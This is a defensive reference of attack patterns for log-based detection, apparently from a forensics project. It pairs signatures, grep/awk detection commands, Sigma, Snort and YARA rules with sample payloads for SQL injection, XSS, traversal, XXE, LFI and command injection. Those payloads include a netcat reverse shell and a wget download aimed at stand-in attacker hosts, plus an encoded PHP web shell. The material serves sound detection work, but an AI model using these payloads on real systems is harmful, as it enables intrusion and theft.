# Attack Patterns Reference

## Quick Detection Reference

### Port Scanning

**Signatures**:
```
- Multiple SYN packets to sequential ports
- Source port constant, destination ports vary
- Time interval < 1 second between connections
- Many connections to closed ports (RST responses)
```

**Detection Command**:
```bash
# Find IPs scanning >20 ports
awk '{print $2, $4}' network.log | \
  grep SYN | \
  awk '{split($1,src,":"); split($2,dst,":"); \
       ports[src[1]][dst[2]]++} \
  END {for (ip in ports) { \
       count=0; for (port in ports[ip]) count++; \
       if (count>20) print ip, count}}'
```

**MITRE**: T1046 - Network Service Scanning

**Mitigation**:
- Rate limit SYN packets
- Deploy port knocking
- Use IDS signatures

---

### SQL Injection

**Signatures**:
```regex
(UNION|SELECT|DROP|INSERT|UPDATE|DELETE).*FROM
'\s*OR\s*'?\d+'\s*=\s*'?\d+
';.*--
/\*.*\*/
EXEC(\s|\+)+(s|x)p\w+
```

**Example Payloads**:
```
admin' OR '1'='1
'; DROP TABLE users--
1 UNION SELECT password FROM accounts
' OR 1=1--
```

**Detection Command**:
```bash
# Find SQL injection attempts
grep -iE "(union.*select|'\s*or\s*'.*=|;.*drop|exec\s+sp)" web.log | \
  awk '{print $1, $7}' | \
  sort | uniq -c | \
  sort -rn
```

**MITRE**: T1190 - Exploit Public-Facing Application

**Mitigation**:
- Parameterized queries
- Input validation
- Web Application Firewall (WAF)
- Principle of least privilege for DB accounts

---

### Cross-Site Scripting (XSS)

**Signatures**:
```regex
<script[^>]*>.*</script>
javascript:
onerror\s*=
onload\s*=
<iframe[^>]*>
eval\(
document\.cookie
```

**Example Payloads**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(document.cookie)
```

**Detection Command**:
```bash
# Find XSS attempts
grep -iE "(<script|javascript:|onerror|onload)" web.log | \
  awk -F'"' '{print $2}' | \
  sort | uniq
```

**MITRE**: T1059 - Command and Scripting Interpreter

**Mitigation**:
- Output encoding
- Content Security Policy (CSP)
- HTTPOnly cookies
- Input sanitization

---

### Directory Traversal

**Signatures**:
```regex
\.\.(/|\\)
\.\.%2f
%2e%2e/
/etc/passwd
/windows/system32
\.\.%5c
```

**Example Payloads**:
```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Detection Command**:
```bash
# Find directory traversal
grep -E "(\.\.(/|\\|%2f|%5c))|(/etc/passwd)|(windows.*system32)" web.log
```

**MITRE**: T1083 - File and Directory Discovery

**Mitigation**:
- Chroot jails
- Path canonicalization
- Whitelist allowed files
- Input validation

---

### SSH Brute Force

**Signatures**:
```
- >5 failed logins in 5 minutes
- Failed password for invalid user
- Sequential username attempts
- Same source IP, different users
```

**Detection Command**:
```bash
# Find brute force attacks
grep "Failed password" ssh.log | \
  awk '{print $1, $2, $11}' | \
  awk '{count[$3]++} END {for (ip in count) \
       if (count[ip]>5) print ip, count[ip]}' | \
  sort -k2 -rn
```

**MITRE**: T1110.001 - Brute Force: Password Guessing

**Mitigation**:
- Fail2ban
- Key-based authentication only
- Rate limiting
- Multi-factor authentication (MFA)

---

### Password Spraying

**Signatures**:
```
- Low attempts per account (<3)
- High number of accounts targeted
- Common passwords (Password123, Spring2025)
- Similar time windows
```

**Detection Command**:
```bash
# Find password spraying
grep "Failed password" ssh.log | \
  awk '{print $9, $11}' | \
  awk '{users[$2]++; ips[$1]++} \
  END {for (ip in ips) if (ips[ip]>10) print ip, ips[ip]}'
```

**MITRE**: T1110.003 - Brute Force: Password Spraying

**Mitigation**:
- Account lockout policies
- Monitor for distributed attacks
- Anomaly detection
- Alert on common passwords

---

### DNS Tunneling

**Signatures**:
```
- Subdomain length >30 characters
- High volume of TXT queries
- Hex or Base64 encoded subdomains
- Single domain receiving all queries
```

**Example Queries**:
```
a4b7c2d9e1f3g8h5i2j7k3.evil.com
5365637265744461746121.attacker.tk
SEVMTE8gV09STEQ=.exfil.xyz
```

**Detection Command**:
```bash
# Find DNS tunneling
awk '{if (length($6)>30) print $1, $2, $6, length($6)}' dns.log | \
  sort -k4 -rn | \
  head -20
```

**MITRE**: T1071.004 - Application Layer Protocol: DNS

**Mitigation**:
- DNS query length limits
- Anomaly detection
- Block suspicious TLDs
- Monitor query entropy

---

### DGA (Domain Generation Algorithm)

**Signatures**:
```
- NXDOMAIN responses
- Random-looking domain names
- Low entropy domain names
- High volume failed queries
```

**Example Domains**:
```
ksjdflkjsdflk.com
xmqpwoeiruty.net
asdkjfhqwoei.org
```

**Detection Command**:
```bash
# Find DGA patterns
grep "NXDOMAIN" dns.log | \
  awk '{print $6}' | \
  sed 's/\..*//' | \
  awk 'length($1)>10 {print}' | \
  sort | uniq -c | \
  sort -rn
```

**MITRE**: T1568.002 - Dynamic Resolution: Domain Generation Algorithms

**Mitigation**:
- DGA detection algorithms
- Threat intelligence feeds
- Block newly registered domains
- Monitor DNS entropy

---

### C2 Beaconing

**Signatures**:
```
- Regular interval connections (300s, 600s)
- Fixed payload sizes
- Unusual User-Agent strings
- HTTPS to non-standard ports
```

**Detection Command**:
```bash
# Calculate connection intervals
grep "SUSPICIOUS_IP" network.log | \
  awk '{print $1, $2}' | \
  awk 'NR>1 {
    cmd="date -d \""$1" "$2"\" +%s"
    cmd | getline curr
    close(cmd)
    print curr-prev
    prev=curr
  }'
```

**MITRE**: T1071 - Application Layer Protocol

**Mitigation**:
- Beacon detection tools
- Egress filtering
- Network behavior analysis
- Block known C2 infrastructure

---

### Data Exfiltration

**Signatures**:
```
- Large outbound transfers
- Uploads during off-hours
- Unusual protocols (FTP from workstation)
- Encrypted streams to unknown hosts
```

**Detection Command**:
```bash
# Find large outbound transfers
awk '$3 == "OUT" && $5 > 10000000 {
  print $1, $2, "IP:", $4, "Size:", $5/1048576"MB"
}' network.log | \
  sort -k6 -rn
```

**MITRE**: T1041 - Exfiltration Over C2 Channel

**Mitigation**:
- DLP (Data Loss Prevention)
- Egress monitoring
- Encrypt sensitive data at rest
- Monitor for anomalies

---

### Web Shell Upload

**Signatures**:
```
- POST requests to upload endpoints
- Files with suspicious extensions (.php, .jsp, .asp)
- Base64 encoded payloads
- eval(), exec(), system() in files
```

**Detection Command**:
```bash
# Find suspicious uploads
grep "POST.*upload" web.log | \
  grep -E "\.(php|jsp|asp|aspx)" | \
  awk '{print $1, $7}'
```

**MITRE**: T1505.003 - Server Software Component: Web Shell

**Mitigation**:
- File type validation
- Upload directory permissions
- Web Application Firewall
- Scan uploads with AV

---

### Credential Stuffing

**Signatures**:
```
- Many different usernames from same IP
- Successful logins after failed attempts
- Leaked credential lists
- Bot-like behavior (perfect intervals)
```

**Detection Command**:
```bash
# Find credential stuffing
awk '/login/ {attempts[$2]++; if ($5=="success") success[$2]++} \
  END {for (ip in attempts) \
       if (attempts[ip]>100 && success[ip]>0) \
       print ip, "Attempts:", attempts[ip], "Success:", success[ip]}' web.log
```

**MITRE**: T1110.004 - Brute Force: Credential Stuffing

**Mitigation**:
- CAPTCHA on login
- Monitor Have I Been Pwned
- Rate limiting
- Multi-factor authentication

---

### XML External Entity (XXE)

**Signatures**:
```xml
<!DOCTYPE.*ENTITY
<!ENTITY.*SYSTEM
file:///etc/passwd
php://filter
```

**Example Payloads**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
```

**Detection Command**:
```bash
# Find XXE attempts
grep -i "<!DOCTYPE\|<!ENTITY\|SYSTEM" web.log | \
  awk '{print $1, $7}'
```

**MITRE**: T1059.007 - Command and Scripting Interpreter: JavaScript

**Mitigation**:
- Disable XML external entities
- Use JSON instead of XML
- Input validation
- Update XML parsers

---

### Local File Inclusion (LFI)

**Signatures**:
```
/proc/self/environ
php://input
data://
expect://
```

**Example Payloads**:
```
?page=/etc/passwd
?file=php://input
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

**Detection Command**:
```bash
# Find LFI attempts
grep -E "(/proc/|php://|data://|expect://)" web.log
```

**MITRE**: T1203 - Exploitation for Client Execution

**Mitigation**:
- Whitelist allowed files
- Disable dangerous PHP wrappers
- Use absolute paths
- Input validation

---

### Remote Code Execution (RCE)

**Signatures**:
```bash
;.*\b(cat|ls|whoami|id|wget|curl)\b
\|\s*(nc|netcat|bash)
eval\(.*\)
exec\(.*\)
```

**Example Payloads**:
```
; cat /etc/passwd
| nc attacker.com 4444 -e /bin/bash
`whoami`
$(wget http://evil.com/shell.sh)
```

**Detection Command**:
```bash
# Find RCE attempts
grep -E "(;|\||\`|\$\().*\b(cat|ls|wget|nc|bash|sh)\b" web.log
```

**MITRE**: T1059 - Command and Scripting Interpreter

**Mitigation**:
- Input sanitization
- Disable dangerous functions
- Principle of least privilege
- Container isolation

---

## Detection Rule Templates

### SIEM Rule Format (Sigma-like)

```yaml
title: SQL Injection Detection
status: stable
description: Detects SQL injection attempts in web logs
logsource:
  category: webserver
detection:
  selection:
    url|contains:
      - 'UNION'
      - 'SELECT'
      - "' OR '"
      - '; DROP'
  condition: selection
falsepositives:
  - Legitimate database tools
  - Admin panels
level: high
```

### Snort-Style IDS Rule

```
alert tcp any any -> any 80 (msg:"SQL Injection Attempt"; \
  content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; \
  classtype:web-application-attack; sid:1000001; rev:1;)
```

### YARA Rule for Web Shell

```yara
rule WebShell_Generic {
    meta:
        description = "Generic Web Shell Detection"
        author = "Net4nSICs"
    strings:
        $eval = /eval\s*\(/
        $exec = /exec\s*\(/
        $system = /system\s*\(/
        $shell_exec = "shell_exec"
        $passthru = "passthru"
    condition:
        2 of them
}
```

---

## Automated Detection Scripts

### Multi-Pattern Scanner

```bash
#!/bin/bash
# attack_scanner.sh - Scan logs for multiple attack patterns

LOG_FILE="$1"

echo "=== ATTACK PATTERN SCANNER ==="
echo "Scanning: $LOG_FILE"
echo ""

echo "[+] SQL Injection:"
grep -icE "(union.*select|'\s*or\s*'.*=)" "$LOG_FILE"

echo "[+] XSS:"
grep -icE "(<script|javascript:|onerror)" "$LOG_FILE"

echo "[+] Directory Traversal:"
grep -icE "(\.\.(/|\\))|(/etc/passwd)" "$LOG_FILE"

echo "[+] Command Injection:"
grep -icE "(;|\|).*\b(cat|ls|whoami)\b" "$LOG_FILE"

echo "[+] XXE:"
grep -icE "<!DOCTYPE.*ENTITY|SYSTEM.*file:" "$LOG_FILE"
```

---

*Comprehensive attack pattern reference for Net4nSICs*
